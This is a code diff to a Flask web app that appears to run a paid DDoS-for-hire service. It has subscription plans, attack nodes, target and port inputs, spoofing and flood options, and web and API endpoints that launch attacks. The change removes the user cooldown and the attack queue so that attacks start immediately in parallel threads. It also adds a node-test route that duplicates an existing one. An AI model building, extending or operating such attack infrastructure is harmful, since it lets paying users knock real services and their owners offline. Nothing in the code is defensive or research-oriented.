@@ -33,7 +33,6 @@ os.makedirs(os.path.join(app.root_path, 'backups'), exist_ok=True)
 
 # ==================== GLOBAL CONFIG ====================
 MAINTENANCE_MODE = False
-GLOBAL_COOLDOWN = 30
 MAX_ATTACK_DURATION = 300
 DEFAULT_THREADS = 2500
 MAX_THREADS_LIMIT = 10000
@@ -61,12 +60,6 @@ PLANS = [
     {'name': 'Enterprise Plan', 'price': '₹999/month', 'concurrent': 5, 'duration': 300, 'threads': 5000, 'key_prefix': 'ENT'},
     {'name': 'Ultimate Plan', 'price': '₹2499/month', 'concurrent': 10, 'duration': 600, 'threads': 10000, 'key_prefix': 'ULT'}
 ]
-
-# ==================== ATTACK QUEUE ====================
-attack_lock = threading.Lock()
-attack_queue = []
-is_attacking = False
-current_attack = None
 
 # ==================== DATABASE SETUP ====================
 USE_MONGO = False
@@ -257,33 +250,6 @@ def admin_required(permission=None):
             return f(*args, **kwargs)
         return decorated_function
     return decorator
-
-def can_user_attack(user):
-    role = user.get('role') if USE_MONGO else user.role
-    if role == 'admin':
-        return True, 0
-    last = user.get('last_attack') if USE_MONGO else user.last_attack
-    if last:
-        elapsed = (datetime.utcnow() - last).total_seconds()
-        if elapsed < GLOBAL_COOLDOWN:
-            return False, GLOBAL_COOLDOWN - elapsed
-    return True, 0
-
-def process_attack_queue():
-    global is_attacking, current_attack
-    while True:
-        with attack_lock:
-            if not attack_queue:
-                is_attacking = False
-                current_attack = None
-                break
-            params = attack_queue.pop(0)
-            current_attack = params
-        try:
-            run_attack(params)
-        except Exception as e:
-            print(f"Attack error: {e}")
-        time.sleep(1)
 
 def build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit):
     flags = []
@@ -570,7 +536,7 @@ def test_vps_node_detailed(node):
         result['status'] = 'dead'
         result['message'] = str(e)
     return result
-    
+
 # ==================== USER ROUTES ====================
 @app.route('/')
 def index():
@@ -640,7 +606,6 @@ def dashboard():
 
 @app.route('/attack', methods=['GET', 'POST'])
 def attack_page():
-    global is_attacking
     if 'user_id' not in session:
         return redirect(url_for('login'))
     if MAINTENANCE_MODE and session.get('user_role') != 'admin':
@@ -690,23 +655,16 @@ def attack_page():
             flash('No free slots', 'danger')
             return redirect(url_for('attack_page'))
 
-        can, remaining = can_user_attack(user)
-        if not can:
-            flash(f'Cooldown: {remaining:.0f}s', 'danger')
-            return redirect(url_for('attack_page'))
-
-        with attack_lock:
-            attack_queue.append({
-                'user_id': ObjectId(session['user_id']) if USE_MONGO else session['user_id'],
-                'target': target, 'port': port, 'duration': duration,
-                'method': method, 'mode': mode, 'threads': threads, 'concurrent': concurrent,
-                'random_ports': random_ports, 'random_delay': random_delay,
-                'spoof': spoof, 'flood': flood, 'pps_limit': pps_limit,
-                'source': 'web'
-            })
-            if not is_attacking:
-                is_attacking = True
-                threading.Thread(target=process_attack_queue).start()
+        # Immediately start attack in background thread
+        params = {
+            'user_id': ObjectId(session['user_id']) if USE_MONGO else session['user_id'],
+            'target': target, 'port': port, 'duration': duration,
+            'method': method, 'mode': mode, 'threads': threads, 'concurrent': concurrent,
+            'random_ports': random_ports, 'random_delay': random_delay,
+            'spoof': spoof, 'flood': flood, 'pps_limit': pps_limit,
+            'source': 'web'
+        }
+        threading.Thread(target=run_attack, args=(params,)).start()
 
         if USE_MONGO:
             users_col.update_one(
@@ -718,7 +676,7 @@ def attack_page():
             user.slots_used += concurrent
             db_sql.session.commit()
 
-        flash('Attack queued', 'success')
+        flash('Attack launched', 'success')
         return redirect(url_for('attack_page'))
 
     return render_template_string(ATTACK_HTML, user=user, methods=ATTACK_METHODS)
@@ -1179,7 +1137,7 @@ def admin_settings():
         }
     return render_template_string(ADMIN_SETTINGS_HTML,
                                   maintenance=MAINTENANCE_MODE,
-                                  cooldown=GLOBAL_COOLDOWN,
+                                  cooldown=0,  # not used anymore
                                   max_duration=MAX_ATTACK_DURATION,
                                   default_threads=DEFAULT_THREADS,
                                   max_threads=MAX_THREADS_LIMIT,
@@ -1188,7 +1146,7 @@ def admin_settings():
 @app.route('/admin/settings/update', methods=['POST'])
 @admin_required('settings')
 def admin_settings_update():
-    global MAINTENANCE_MODE, GLOBAL_COOLDOWN, MAX_ATTACK_DURATION, DEFAULT_THREADS, MAX_THREADS_LIMIT
+    global MAINTENANCE_MODE, MAX_ATTACK_DURATION, DEFAULT_THREADS, MAX_THREADS_LIMIT
     action = request.form.get('action')
     if action == 'change_password':
         new_pass = request.form.get('new_password')
@@ -1213,7 +1171,6 @@ def admin_settings_update():
         MAINTENANCE_MODE = not MAINTENANCE_MODE
         flash(f'Maintenance mode {"enabled" if MAINTENANCE_MODE else "disabled"}', 'success')
     elif action == 'update_config':
-        GLOBAL_COOLDOWN = int(request.form.get('cooldown', 30))
         MAX_ATTACK_DURATION = int(request.form.get('max_duration', 300))
         DEFAULT_THREADS = int(request.form.get('default_threads', 1500))
         MAX_THREADS_LIMIT = int(request.form.get('max_threads', 10000))
@@ -1645,27 +1602,24 @@ def api_attack():
     if slots_used + concurrent > max_conc:
         return jsonify({'error': 'No free slots'}), 429
 
-    with attack_lock:
-        attack_queue.append({
-            'user_id': user_id,
-            'target': target,
-            'port': port,
-            'duration': duration,
-            'method': method,
-            'mode': mode,
-            'threads': threads,
-            'concurrent': concurrent,
-            'random_ports': random_ports,
-            'random_delay': random_delay,
-            'spoof': spoof,
-            'flood': flood,
-            'pps_limit': pps_limit,
-            'source': 'api'
-        })
-        global is_attacking
-        if not is_attacking:
-            is_attacking = True
-            threading.Thread(target=process_attack_queue).start()
+    # Start attack immediately in a thread
+    params = {
+        'user_id': user_id,
+        'target': target,
+        'port': port,
+        'duration': duration,
+        'method': method,
+        'mode': mode,
+        'threads': threads,
+        'concurrent': concurrent,
+        'random_ports': random_ports,
+        'random_delay': random_delay,
+        'spoof': spoof,
+        'flood': flood,
+        'pps_limit': pps_limit,
+        'source': 'api'
+    }
+    threading.Thread(target=run_attack, args=(params,)).start()
 
     if USE_MONGO:
         users_col.update_one(
@@ -1684,13 +1638,12 @@ def api_attack():
         db_sql.session.commit()
 
     return jsonify({
-        'status': 'queued',
-        'position': len(attack_queue),
+        'status': 'launched',
         'duration': duration,
         'endsAt': (datetime.utcnow() + timedelta(seconds=duration)).isoformat()
     }), 200
 
-# ==================== LIVE STATUS APIs ====================
+# ==================== LIVE NODE STATUS APIs (no attack status) ====================
 @app.route('/admin/nodes/status/all')
 @admin_required('dashboard')
 def admin_nodes_status_all():
@@ -1712,6 +1665,21 @@ def admin_nodes_status_all():
                 'enabled': node.enabled, 'status': node.status_detail or 'unknown',
                 'binary': node.binary_present, 'attack_count': node.attack_count
             })
+    return jsonify(result)
+
+@app.route('/admin/nodes/<node_id>/test', methods=['POST'])
+@admin_required('nodes')
+def admin_test_node_ajax(node_id):
+    if USE_MONGO:
+        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
+    else:
+        node = AttackNode.query.get(node_id)
+    if not node:
+        return jsonify({'error': 'Node not found'}), 404
+    if (node['node_type'] if USE_MONGO else node.node_type) == 'vps':
+        result = test_vps_node_detailed(node)
+    else:
+        result = test_github_node_detailed(node)
     return jsonify(result)
 
 @app.route('/admin/nodes/<node_id>/test', methods=['POST'])
